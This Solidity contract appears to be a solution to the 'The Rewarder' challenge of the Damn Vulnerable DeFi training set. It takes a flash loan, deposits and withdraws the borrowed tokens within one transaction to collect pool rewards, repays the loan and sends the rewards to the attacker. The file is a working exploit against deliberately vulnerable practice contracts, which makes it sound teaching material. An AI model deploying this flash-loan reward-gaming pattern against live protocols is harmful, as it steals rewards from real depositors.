// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.17;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "../DamnValuableToken.sol";

contract Exploit {
    address immutable attacker;
    DamnValuableToken dvt;
    FlashLoanerPool loaner;
    TheRewarderPool rewardPool;

    constructor(address _loaner, address _rewardPool, address _dvt) {
        attacker = msg.sender;
        dvt = DamnValuableToken(_dvt);
        loaner = FlashLoanerPool(_loaner);
        rewardPool = TheRewarderPool(_rewardPool);
    }

    function exploit() public {
        loaner.flashLoan(1000000e18);
    }

    function receiveFlashLoan(uint256 amount) public {
        dvt.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        dvt.transfer(msg.sender, amount);
    }

    function withdraw() public {
        rewardPool.rewardToken().transfer(attacker, rewardPool.rewardToken().balanceOf(address(this)));
    }
}
